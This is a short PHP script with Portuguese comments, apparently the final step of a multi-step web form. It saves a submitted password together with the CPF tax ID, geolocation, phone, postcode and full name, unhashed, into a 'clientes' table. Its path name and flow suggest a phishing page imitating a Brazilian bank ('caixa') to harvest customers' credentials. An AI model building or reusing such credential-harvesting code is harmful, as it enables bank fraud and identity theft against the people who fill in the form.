<?php
//SENHA / FINAL
session_start();
if(isset($_POST['senha'])){
    $_SESSION['senha'] = $_POST['senha'];
    if(isset($_POST['senha'])){
        //enviar id / cpf / senha / lat / long / tel / cep  / nome 
        $sql = $pdo->prepare("INSERT INTO clientes VALUES (null,?,?,?,?,?,?,?)");
        $sql->execute(array(
            $_SESSION['cpf'],
            $_SESSION['senha'],
            $_SESSION['lat'],
            $_SESSION['long'],
            $_SESSION['tel'],
            $_SESSION['cep'],
            $_SESSION['nomecompleto']
        ));
        header("location: http://localhost/tela_caixa_decimo/sucesso");
    }
 }else{
    header("location: http://localhost/tela_caixa_decimo/step-1");
 }
?>
